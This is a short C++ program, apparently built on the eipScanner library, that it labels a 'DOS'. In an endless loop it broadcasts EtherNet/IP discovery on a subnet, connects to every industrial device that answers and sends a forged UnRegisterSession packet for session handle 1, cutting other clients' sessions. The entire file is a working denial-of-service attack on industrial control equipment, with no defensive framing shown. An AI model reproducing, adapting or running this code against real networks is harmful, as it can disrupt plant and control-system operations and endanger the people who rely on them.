//
// Created by Benjamin van Seggelen
//
#include <thread>
#include "utils/Logger.h"

#include "DiscoveryManager.h"
#include "SessionInfo.h"
#include "eip/EncapsPacket.h"
#include "eip/EncapsPacketFactory.h"

using eipScanner::DiscoveryManager;
using eipScanner::IdentityItem;
using eipScanner::SessionInfo;
using eipScanner::eip::EncapsPacket;
using eipScanner::eip::EncapsPacketFactory;
using eipScanner::utils::Logger;
using eipScanner::utils::LogLevel;

int main()
{
    Logger::setLogLevel(LogLevel::DEBUG);
    IdentityItem::Vec devices;

    std::this_thread::sleep_for(std::chrono::seconds(10));
    Logger(LogLevel::INFO) << "Starting DOS";

    while (true)
    {
        DiscoveryManager discoveryManager("172.28.255.255", 0xAF12, std::chrono::seconds(5));
        devices = discoveryManager.discover();

        for (const auto device : devices)
        {
            eipScanner::sockets::TCPSocket socket(device.socketAddress);
            EncapsPacket packet = EncapsPacketFactory().createUnRegisterSessionPacket(1);
            socket.Send(packet.pack());
            Logger(LogLevel::INFO) << "Unregistered session " << 1;
        }
    }

    return EXIT_SUCCESS;
}